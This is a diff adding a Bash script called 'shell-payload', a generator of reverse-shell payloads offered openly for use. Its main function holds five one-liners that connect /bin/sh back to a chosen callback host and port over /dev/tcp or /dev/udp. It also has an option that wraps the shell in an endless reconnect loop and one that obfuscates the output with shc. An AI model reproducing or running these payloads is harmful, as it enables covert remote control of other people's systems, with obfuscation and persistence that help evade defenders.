@@ -1,0 +1,310 @@
+#!/usr/bin/env bash
+#####################################################################
+#
+# Author : Abner Benedito
+# Github : ghostkill73
+# Version: 1.0
+# License: WTFPLv2
+#
+#####################################################################
+# License
+#
+#            DO WHAT THE FUCK YOU WANT TO PUBLIC LICENSE
+#                     Version 2, December 2004
+#
+#          Copyright (C) 2024 Abner Benedito <ghostkill73>
+#
+# Everyone is permitted to copy and distribute verbatim or modified
+# copies of this license document, and changing it is allowed as long
+# as the name is changed.
+#
+#            DO WHAT THE FUCK YOU WANT TO PUBLIC LICENSE
+#   TERMS AND CONDITIONS FOR COPYING, DISTRIBUTION AND MODIFICATION
+#
+#  0. You just DO WHAT THE FUCK YOU WANT TO.
+#
+######################################################################
+
+######################################################################
+# Variables and Configs
+######################################################################
+
+#set -u
+#set -x
+
+declare _global_software_name="shell-payload"
+declare _global_software_version="1.0"
+
+declare _global_true="0"
+declare _global_false="1"
+declare _global_error="2"
+
+######################################################################
+# Functions for displaying messages
+######################################################################
+
+msg()
+{
+	printf '%b\n' "${*}" 2>/dev/null
+}
+
+sucess()
+{
+	msg "${0}: \e[1;32msucess:\e[m ${*}"
+}
+
+warn()
+{
+	msg "${0}: \e[1;33mwarning:\e[m ${*}"
+}
+
+die()
+{
+	msg "${0}: \e[1;31mfatal error:\e[m ${*}"
+}
+
+vmsg()
+{
+	[[ "${_main_verbose:=no}" = 'yes' ]] \
+	&& msg "\e[1;35m[VERBOSE]\e[m ${*}"
+}
+
+######################################################################
+# Informations
+######################################################################
+
+display_message()
+{
+	die "No arguments have been given."
+	msg "Try '"$0 --help"' or '"$0 --usage"' for more information."
+
+	exit "$_global_error"
+}
+
+display_license()
+{
+	msg "            DO WHAT THE FUCK YOU WANT TO PUBLIC LICENSE"
+	msg "                     Version 2, December 2004"
+	msg ""
+	msg "          Copyright (C) 2024 Abner Benedito <ghostkill73>"
+	msg ""
+	msg " Everyone is permitted to copy and distribute verbatim or modified"
+	msg " copies of this license document, and changing it is allowed as long"
+	msg " as the name is changed."
+	msg ""
+	msg "            DO WHAT THE FUCK YOU WANT TO PUBLIC LICENSE"
+	msg "   TERMS AND CONDITIONS FOR COPYING, DISTRIBUTION AND MODIFICATION"
+	msg ""
+	msg "  0. You just DO WHAT THE FUCK YOU WANT TO."
+
+	exit "$_global_true"
+}
+
+display_version()
+{
+	msg "$_global_software_name v${_global_software_version}"
+
+	exit "$_global_true"
+}
+
+display_error()
+{
+	local _display_error_arg="$1"
+
+	die "-- '"$_display_error_arg"' this option does not exist."
+	msg "Try '"$0 --help"' for more information."
+
+	exit "$_global_error"
+}
+
+display_help()
+{
+	msg "Usage: $0 [OPTIONS...]"
+	msg ""
+	msg "Examples:"
+	msg ""
+	msg " $0 --method udp --lhost 10.10.10.10 --lport 7070"
+	msg " $0 --loop 5 --lhost 10.10.10.10 --lport 7070 --obfuscate"
+	msg ""
+	msg " Informative options:"
+	msg ""
+	msg "	-h, --help	displays this message"
+	msg "	    --version	displays the software version"
+	msg "	-l, --license	displays the software license"
+	msg ""
+	msg " Payload's options:"
+	msg ""
+	msg "	--lhost		Callback IP"
+	msg "	--lport		Callback port"
+	msg "	-m, --method	reverse shell method type"
+	msg "			 avaliable methods:"
+	msg "			  tcp (default), udp, sh196, readline, sh5"
+	msg "	--obfuscate	obfuscate the output with shc (Shell Script Compiler)"
+	msg "	--loop		make the payload's run"
+
+	exit "$_global_true"
+}
+
+######################################################################
+# Main function
+######################################################################
+
+main()
+{
+	local _main_payload _main_mpayloads
+
+	declare -A _main_mpayloads
+
+	: ${_main_out:=payload.out}
+	: ${_main_method:=tcp}
+	: ${_main_obf=no}
+	: ${_main_loop:=no}
+
+	_main_mpayloads=(
+		["tcp"]="/bin/sh -i >& /dev/tcp/${_main_lhost}/${_main_lport} 0>&1"
+		["udp"]="/bin/sh -i >& /dev/udp/${_main_lhost}/${_main_lport} 0>&1"
+		["sh196"]="0<&196;exec 196<>/dev/tcp/${_main_lhost}/${_main_lport}; /bin/sh -i <&196 >&196 2>&196"
+		["readline"]="exec 5<>/dev/tcp/${_main_lhost}/${_main_lport}; cat <&5 | while read line; do $line; done"
+		["sh5"]="/bin/sh -i 5<> /dev/tcp/${_main_lhost}/${_main_lport} 0<&5 1>&5 2>&5"
+	)
+
+	vmsg "verbose == ${_main_verbose}"
+
+	[[ -e "$_main_out" ]] && {
+		die "$_main_out alredy exists."
+		exit "$_global_error"
+	} || vmsg "output == ${_main_out}"
+
+	[[ -z "$_main_lhost" ]] || [[ "${_main_lhost:0:1}" = '-' ]] \
+	&& {
+		die "invalid LHOST."
+		exit "$_global_error"
+	} || vmsg "LHOST == ${_main_lhost}"
+
+	[[ -z "$_main_lport" ]] || [[ "${_main_lport:0:1}" = '-' ]] \
+	&& {
+		die "invalid LPORT."
+		exit "$_global_error"
+	} || vmsg "LPORT == ${_main_lport}"
+
+	if [[ -n "${_main_mpayloads[${_main_method}]}" ]]; then
+		declare _main_payload="${_main_mpayloads[${_main_method}]}"
+	else
+		die "invalid method."
+		exit "$_global_error"
+	fi && vmsg "method == ${_main_method}"
+
+	[[ "$_main_loop" = 'no' ]] || {
+		declare _main_payload="for((;;)){ sleep ${_main_loop}; /bin/sh -c '"${_main_payload}"'; }"
+	} && vmsg "loop == ${_main_loop}"
+
+	vmsg "payload == '"${_main_payload}"'"
+
+	if [[ "$_main_obf" = 'yes' ]]; then
+		vmsg "obfuscate == ${_main_obf}"
+		warn "wait a moment..."
+
+		msg "#!/bin/sh\n${_main_payload}" > ${_main_out}.tmp
+
+		shc -o "${_main_out}" -f "${_main_out}.tmp"
+
+		rm -f ${_main_out}.tmp*
+
+		sucess "$_main_out with obfuscation generated sucessfully"
+	else
+		msg "${_main_payload}" > ${_main_out} \
+		&& sucess "$_main_out generated sucessfully"
+	fi
+
+	exit "$_global_true"
+}
+
+######################################################################
+# Script
+######################################################################
+
+[[ "$#" = '0' ]] && {
+	display_message
+}
+
+while :; do
+
+	[[ "$#" = '0' ]] && break
+
+	case "$1" in
+		'-h'|'--help')
+			display_help
+		;;
+
+		'--version')
+			display_version
+		;;
+
+		'-l'|'--license')
+			display_license
+		;;
+
+		'-v'|'--verbose')
+			declare _main_verbose='yes'
+			shift
+			continue
+		;;
+
+		'-m'|'--method')
+			declare _main_method="$2"
+			shift 2
+			continue
+		;;
+
+		'--lhost')
+			declare _main_lhost="$2"
+			shift 2
+			continue
+		;;
+
+		'--lport')
+			declare _main_lport="$2"
+			shift 2
+			continue
+		;;
+
+		'-o'|'--output')
+			declare _main_out="$2"
+			shift 2
+			continue
+		;;
+
+		'-L'|'--loop')
+			case "$2" in
+				''|*[!0-9]*)
+					declare _main_loop='10'
+					shift
+				;;
+
+				*)
+					declare _main_loop="$2"
+					shift 2
+				;;
+			esac
+
+			continue
+		;;
+
+		'-O'|'--obfuscate')
+			declare _main_obf='yes'
+			shift
+			continue
+		;;
+
+		'--')
+			shift
+			break
+		;;
+
+		*)
+			display_error "$1"
+		;;
+	esac
+done
+
+main
